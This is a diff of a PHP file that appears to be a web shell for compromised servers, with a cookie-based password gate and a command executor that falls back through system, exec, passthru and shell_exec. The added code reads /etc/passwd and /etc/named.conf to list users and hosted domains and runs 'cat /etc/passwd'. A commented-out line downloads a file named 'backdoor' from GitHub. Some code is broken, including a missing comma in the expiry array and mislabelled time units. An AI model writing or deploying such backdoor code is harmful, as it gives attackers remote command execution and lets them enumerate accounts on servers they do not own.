@@ -1,29 +1,24 @@
 <?php
+$auth = new auth('$2y$10$JT0BFe72VBxP4wL1HqOIxuQL10EaVOV0wRz1OGw/m7XVNQf7JH0py');
 class auth
 {
 	private $password;
 	protected $cookie;
 	protected $post;
-	protected $expired;
-	function __construct($password, $expired)
+	protected $expired = [
+		60, // 1 second
+		60*60, // 1 minute
+		60*60*1, // 1 hour
+		60*60*24, // 1 day
+		60*60*24*30 // 1 month
+		60*60*24*30*12 // 1 year
+	];
+	function __construct($password, $expired = null)
 	{
 		$this->password = $password;
-		$this->expired  = $expired;
-		if(isset($this->password) && (trim($this->password) != '')){
-			$this->cookie = $_COOKIE;
-			$this->post = $_POST;
-			if(isset($this->post['pass'])){
-				$yourPassword = sha1($this->post['pass']);
-				if (password_verify($this->post["pass"], $this->password)) {
-					setcookie("pass", $this->password, time()+$this->expired, "/");
-					header("Location: {$_SERVER['PHP_SELF']}");
-				}
-			}
-			if(!isset($this->cookie['pass']) || ((isset($this->cookie['pass']) && ($this->cookie['pass'] != $this->password)))){
-				$this->displayLogin();
-				die();
-			}
-		}
+		$this->cookie = $_COOKIE;
+		$this->post = $_POST;
+		return $this->login($this->password, $this->expired[0]);
 	}
 	public function displayLogin()
 	{
@@ -33,7 +28,33 @@ class auth
 		</form>
 		<?php
 	}
+
+	public function login($password, $expired = 36000)
+	{
+		if(isset($password) && (trim($password) != '')){
+			if(isset($this->post['pass'])){
+				if (password_verify($this->post["pass"], $password)) {
+					setcookie("pass", $password, time()+$expired, "/");
+					header("Location: {$_SERVER['PHP_SELF']}");
+				}
+			}
+			if(!isset($this->cookie['pass']) || ((isset($this->cookie['pass']) && ($this->cookie['pass'] != $password)))){
+				$this->displayLogin();
+				die();
+			}
+		}
+	}
+
+	public function logout()
+	{
+		if (isset($this->cookie["pass"])) {
+			setcookie("pass", "", time() - 1);
+			header("Location: {$_SERVER['PHP_SELF']}");
+		}
+	}
 }
+
+
 class listFiles
 {
 	protected $path;
@@ -125,89 +146,6 @@ class cd extends listFiles
  * 
  */
 
-class Tools
-{
-	protected $path, $name, $resource, $data = null, $cwd = null;
-	
-	function __construct()
-	{
-		$this->path = str_replace("\\", "/", getcwd());
-	}
-
-	public function make($filename)
-	{
-		$this->resource = $filename;
-		return $this;
-	}
-
-	public function path($path)
-	{
-		$this->cwd = $path;
-		return $this;
-	}
-
-	public function dir()
-	{
-		return (!empty($this->resource)) ? mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->resource) : false;
-	}
-
-	public function file($data)
-	{
-		foreach ($this->resource as $key => $value) {
-			$explode = explode("|", $this->resource[$key]);
-			foreach ($explode as $i => $file) {
-				file_put_contents($file, $data);
-			}
-		}
-	}
-
-	public function command($command)
-	{
-		$command = $command;
-
-		switch ($command) {
-			case function_exists("system"):
-				@ob_start();
-				@system($command);
-				$buff = @ob_get_contents(); 
-				@ob_end_clean();
-				return $buff; 	
-				break;
-			
-			case function_exists("exec"):
-				@exec($command, $result);
-				$buff = "";
-				foreach ($result as $key => $value) {
-					$buff .= $value;
-				} return $buff;
-				break;
-
-			case function_exists("passthru"):
-				@ob_start();
-				@passthru($command);
-				$buff = @ob_get_contents();
-				@ob_end_clean();
-				return $buff;
-				break;
-
-			case function_exists("shell_exec"):
-				$buff = @shell_exec($command);
-				return $buff;
-				break;
-		}
-	}
-
-	/*public function Upload($files)
-	{
-		foreach ($files['error'] as $key => $value) {
-			if ($value === UPLOAD_ERR_OK) {
-				move_uploaded_file($value["tmp_name"][$key], $this->cwd . $value["name"][$key]);
-			}
-		}
-	}*/
-}
-
-
 class Action
 {
 	protected $path, $filename;
@@ -224,6 +162,32 @@ class Action
 	{
 		$this->path = str_replace("\\", "/", getcwd());
 		$this->filename = $filename;
+	}
+
+	public function getUser($filename = "/etc/passwd")
+	{
+		if (file_exists($filename)) {
+			$this->handle = fopen($filename, $this->modes["read"]);
+			while ($read = fgetc($this->handle)) {
+				preg_match_all('/(.*?):x:/', $read, $matches);
+				$user[] = $matches[1][0];
+			} return $user;
+		} else {
+			return false;
+		}
+	}
+
+	public function getDomian($filename = "/etc/named.conf")
+	{
+		if (file_exists($filename)) {
+			$this->handle = fopen($filename, $this->modes["read"]);
+			while ($read = fgetc($this->handle)) {
+				preg_match_all("#/var/named/(.*?).db#", $read, $matches);
+				$domian[] = $matches[1][0];
+			} return $domian;
+		} else {
+			return false;
+		}
 	}
 
 	public function OS()
@@ -326,27 +290,119 @@ class Action
 	public function delete()
 	{
 		if (is_dir($this->filename)) {
-			if (!@rmdir($this->filename) AND $this->OS() === "Linux") $this->command("rm -rf ".$this->filename."");
-			if (!@rmdir($this->filename) AND $this->OS() === "Windows") $this->command("rmdir /s /q ".$this->filename."");
+			if (!@rmdir($this->filename) AND $this->OS() === "Linux") $this->execute("rm -rf ".$this->filename."");
+			if (!@rmdir($this->filename) AND $this->OS() === "Windows") $this->execute("rmdir /s /q ".$this->filename."");
 		} elseif (is_file($this->filename)) {
 			unlink($this->filename);
 		}
 	}
 }
 
-if (isset($_GET['cd'])) {
-	new cd($_GET['cd']);
+class Tools extends Action
+{
+	protected $path, $name, $resource, $data = null, $cwd = null;
+	
+	function __construct()
+	{
+		$this->path = str_replace("\\", "/", getcwd());
+	}
+
+	public function make($filename)
+	{
+		$this->resource = $filename;
+		return $this;
+	}
+
+	public function path($path)
+	{
+		$this->cwd = $path;
+		return $this;
+	}
+
+	public function dir()
+	{
+		return (!empty($this->resource)) ? mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->resource) : false;
+	}
+
+	public function file($data)
+	{
+		foreach ($this->resource as $key => $value) {
+			$explode = explode("|", $this->resource[$key]);
+			foreach ($explode as $i => $file) {
+				file_put_contents($file, $data);
+			}
+		}
+	}
+
+	public function execute($command)
+	{
+		$command = $command;
+
+		switch ($command) {
+			case function_exists("system"):
+				@ob_start();
+				@system($command);
+				$buff = @ob_get_contents(); 
+				@ob_end_clean();
+				return $buff; 	
+				break;
+			
+			case function_exists("exec"):
+				@exec($command, $result);
+				$buff = "";
+				foreach ($result as $key => $value) {
+					$buff .= $value;
+				} return $buff;
+				break;
+
+			case function_exists("passthru"):
+				@ob_start();
+				@passthru($command);
+				$buff = @ob_get_contents();
+				@ob_end_clean();
+				return $buff;
+				break;
+
+			case function_exists("shell_exec"):
+				$buff = @shell_exec($command);
+				return $buff;
+				break;
+		}
+	}
+
+	public function getPasswd()
+	{
+		if ($this->OS() === "Linux") {
+			return $this->execute("cat /etc/passwd");
+		} else {
+			return false;
+		}
+	}
+
+	/*public function Upload($files)
+	{
+		foreach ($files['error'] as $key => $value) {
+			if ($value === UPLOAD_ERR_OK) {
+				move_uploaded_file($value["tmp_name"][$key], $this->cwd . $value["name"][$key]);
+			}
+		}
+	}*/
 }
-// // $Action = new Action;
-// // var_dump($Action->download("https://raw.githubusercontent.com/rabbitx1337/backdoor/main/FileSystem.php", "asw.php"));
-// // die();
 
-$list = new listFiles;
+// if (isset($_GET['cd'])) {
+// 	new cd($_GET['cd']);
+// }
+// // // $Action = new Action;
+// // // var_dump($Action->download("https://raw.githubusercontent.com/rabbitx1337/backdoor/main/FileSystem.php", "asw.php"));
+// // // die();
 
-// foreach ($list->folder() as $key => $value) {
-// 	print("<a href='?cd={$value['getPathname']}'>{$value['getName']}</a><br>");
-// }
-// foreach ($list->files() as $key => $value) {
-// 	print($value['getName']."<br>");
-// }
-var_dump($list);
+// $list = new listFiles;
+
+// // foreach ($list->folder() as $key => $value) {
+// // 	print("<a href='?cd={$value['getPathname']}'>{$value['getName']}</a><br>");
+// // }
+// // foreach ($list->files() as $key => $value) {
+// // 	print($value['getName']."<br>");
+// // }
+// $Action = new Action;
+// var_dump($Action->getUser());
